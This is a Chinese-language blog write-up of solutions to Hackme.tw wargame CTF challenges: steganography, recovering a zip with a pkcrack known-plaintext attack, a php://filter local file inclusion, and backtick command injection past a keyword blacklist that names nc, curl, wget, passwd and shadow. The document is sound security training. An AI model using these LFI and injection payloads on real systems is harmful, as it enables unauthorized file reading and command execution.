---
title: 'HackmeTw Wargame Write-Up'
author: TwinkleStar03
tags: [Hackme.tw]
categories: [Write-Up]
date: 2019-06-24
description: 練習 CTF 相關知識的過程與心得。
---

[網站在這邊>~<](https://hackme.inndy.tw)

未來一直更新下去的話文章會很長很長，如果想要針對某一題或是類別的話電腦板網站左側有文章目錄可以按!

-----

# Misc #

-----

## flag ##
> All flags are in this format: FLAG{XXXXXXXXX}

如題目敘述所示XDD

-----

##  corgi can fly ##
> Corgi is cute, right?

不知道該做甚麼的時候\.\.\.`hexdump -C`!!
```
000cb150  61 6e 20 46 6c 79 dc 8d  04 1e 00 00 00 23 74 45  |an Fly.......#tE|
000cb160  58 74 41 72 74 69 73 74  00 52 47 6c 6b 49 48 6c  |XtArtist.RGlkIHl|
000cb170  76 64 53 42 30 63 6d 6c  6c 5a 43 42 4d 55 30 49  |vdSB0cmllZCBMU0I|
000cb180  2f 43 67 3d 3d d1 5a 87  ea 00 00 00 00 49 45 4e  |/Cg==.Z......IEN|
000cb190  44 ae 42 60 82                                    |D.B`.|
```
在結尾有看到base64編碼過的編碼，特徵應該就是那兩個`==`，拿去base64 decode一下吧~
`RGlkIHlvdSB0cmllZCBMU0ICg==` => `Did you tried LSB`
不知道甚麼是LSB，先Google一下吧，查到了LSB是一種可以在圖片中隱寫的技巧，這時候就來找工具吧!

這邊使用了**stegsolve**，一種圖片解碼器吧(?。 總之點開來load圖片進去然後gui點一點就會得到一個QRcode，掃一下答案就出來了!!

-----

## television ##
> Looks like my television was broken

這一題一開始會拿到一個`.bmp`的檔案，所以我就敲了`bmp file encryption`進去了google，得到了一個可能的答案: CBC Encrypted，因為被這種加密過後的bmp圖片跟題目給出來的長的差不多，結果好像不是....

所以我用了`strings`觀察一下檔案....

Flag直接就在裡面了XDD

-----

## meow ##
> Pusheen is cute!

這次拿到了一個`.png`檔案，`binwalk`走起看看裡面藏了甚麼
```
binwalk meow.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 296 x 279, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
48543         0xBD9F          Zip archive data, at least v1.0 to extract, name: meow/
48606         0xBDDE          Zip archive data, encrypted at least v2.0 to extract, compressed size: 51, uncompressed size: 47, name: meow/flag
48740         0xBE64          Zip archive data, at least v1.0 to extract, name: meow/t39.1997-6/
48814         0xBEAE          Zip archive data, at least v1.0 to extract, name: meow/t39.1997-6/p296x100/
48897         0xBF01          Zip archive data, encrypted at least v2.0 to extract, compressed size: 48404, uncompressed size: 48543, name: meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png
97912         0x17E78         End of Zip archive, footer length: 22
```
恩...看起來有.zip藏在裡面呢w 怎麼把它挖出來呢，使用`foremost`一個檔案還原工具!
之後會產出一個output資料夾，裡面有剛剛的`00000094.zip`還額外拿到一個`00000000.png`，

總之先`unzip 00000094.zip`\.\.\.\.
```
Archive:  00000094.zip
[00000094.zip] meow/flag password:
```

看起來跟我要密碼，~~我去哪裡生出來XDD~~
先分析看看這個拆出來的`.zip`吧，`unzip -v`走起!!(**unzip -v: list verbosely/show version info**)

```
unzip -v 00000094.zip
Archive:  00000094.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
       0  Stored        0   0% 2016-06-11 17:22 00000000  meow/
      47  Defl:N       39  17% 2016-06-11 17:22 3046cea4  meow/flag
       0  Stored        0   0% 2016-06-11 17:20 00000000  meow/t39.1997-6/
       0  Stored        0   0% 2016-06-11 17:21 00000000  meow/t39.1997-6/p296x100/
   48543  Defl:N    48392   0% 2014-05-14 06:59 cdad52bd  meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png
--------          -------  ---                            -------
   48590            48431   0%                            5 files
```
這裡頭也有一個.png耶，他的CRC32: cdad52bd，把剛剛招喚出來的`00000000.png`比較CRC32看看....**一致耶!**

這樣的話這個 **zip存在著明文攻擊(known plain text attack)** 的! **`pkcrack`走起!!**
如果要執行這個攻擊方式的話要**把已知的部分製作成zip file**，再使用pkcrack工具(之後來研究原理再做個文章介紹)。
```
zip plain.zip 00000000.png`
pkcrack -C 00000094.zip  -c meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png -P plain.zip  -p ../png/00000000.png -d resu
lt.zip -a
unzip result.zip
cat meow/flag
```
這個花好多心力再搞懂zip跟一些工具，花了不少時間但是收穫多多!d(\`･∀･)b

-----

## where is flag ##
> Do you know regular expression? 

TBD

-----

# Web #

-----

## hide and seek ##
> Can you see me? I'm so close to you but you can't see me.

對著Hackme.tw的首頁`Ctrl + U` & `Ctrl + F`輸入FLAG，蹦!

-----

## guestbook
> This guestbook sucks. sqlmap is your friend.

TBD

-----

## LFI ##
> What this admin's password? That is not important at all, just get the flag.
Tips: LFI, php://filter

這題我發現有兩條路可以走，都可以拿到Flag，**兩條路的攻擊方法都是Local File Inclusion Attack**只是一個是打`/login`一個是猜的，開始囉(ゝ∀･)

我們一開始可以看到網址`https://hackme.inndy.tw/lfi/?page=pages/index`使用了`?page`來取得資源，但是如果直接改掉網址轉向到其他地方會出現一個訊息
```
H@cK3r F0UnD
```
這很明顯不是我們要的，在題目的提示還給出了`php://filter`這個提示，應該是希望我們使用這個東西來bypass掉網址保護，把內容用base64 encode之後輸出`php://filter/read=convert.base64-encode/resource=`

把網址改成`https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag`來存取網頁原始碼(flag.php是猜的)

得到一串Base64，找個工具decode得出
```
Can you read the flag<?php require('config.php'); ?>?
```

還真的有東西，那就讀他的`config.php`吧! Flag就在裡面

-----

## homepage ##
> Where is the flag? Did you check the code?

在首頁使用`F12`然後進到console tab，有個QRCodeXD

-----

## ping ##
> Can you ping 127.0.0.1?

一點進去就會出現一個網頁有textbox跟button，而且一開始就把php source code吐出來了。
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ping</title>
</head>
<body>
    <form action="." method="GET">
        IP: <input type="text" name="ip"> <input type="submit" value="Ping">
    </form>
    <pre><?php
        $blacklist = [
            'flag', 'cat', 'nc', 'sh', 'cp', 'touch', 'mv', 'rm', 'ps', 'top', 'sleep', 'sed',
            'apt', 'yum', 'curl', 'wget', 'perl', 'python', 'zip', 'tar', 'php', 'ruby', 'kill',
            'passwd', 'shadow', 'root',
            'z',
            'dir', 'dd', 'df', 'du', 'free', 'tempfile', 'touch', 'tee', 'sha', 'x64', 'g',
            'xargs', 'PATH',
            '$0', 'proc',
            '/', '&', '|', '>', '<', ';', '"', '\'', '\\', "\n"
        ];

        set_time_limit(2);

        function ping($ip) {
            global $blacklist;

            if(strlen($ip) > 15) {
                return 'IP toooooo longgggggggggg';
            } else {
                foreach($blacklist as $keyword) {
                    if(strstr($ip, $keyword)) {
                        return "{$keyword} not allowed";
                    }
                }
                $ret = [];
                exec("ping -c 1 \"{$ip}\" 2>&1", $ret);
                return implode("\n", array_slice($ret, 0, 10));
            }
        }

        if(!empty($_GET['ip']))
            echo htmlentities(ping($_GET['ip']));
        else
            highlight_file(__FILE__);
    ?></pre>
</body>
</html>
```

我們可以觀察到前面有個blacklist，看起來是用來避免textbox出現這些東西，繼續往下就會看到有個`exec()`的function，我們應該可以透過command injection來拿flag

但是不能直接寫指令上去，要先把之前的ping隔開，但是大多數的符號都被禁止了，好佳在**"\`(反斜線)"**沒有被禁止，而且`ls`也沒有被禁止，我們先試試看`反斜線ls反斜線`吧!

```
ping: flag.php
index.php: Name or service not known
```
看起來有個`flag.php`的檔案，但是我們不能使用`cat`也不能寫腳本讓他跑，但其實還有`sort`可以用，試試看`sort flag.php`!
```
flag not allowed
```
對耶，flag也在blacklist裡面，我們還有一種工具，叫做wildcard`?`，那把輸入改成`sort ????????`就會吐flag出來了!

看起來blacklist沒有禁止`grep`之後再來試試看能不能用grep吐flag。

-----

## scoreboard ##
> DO NOT ATTACK or SCAN scoreboard, you don't need to do that.

Flag在response header裡面。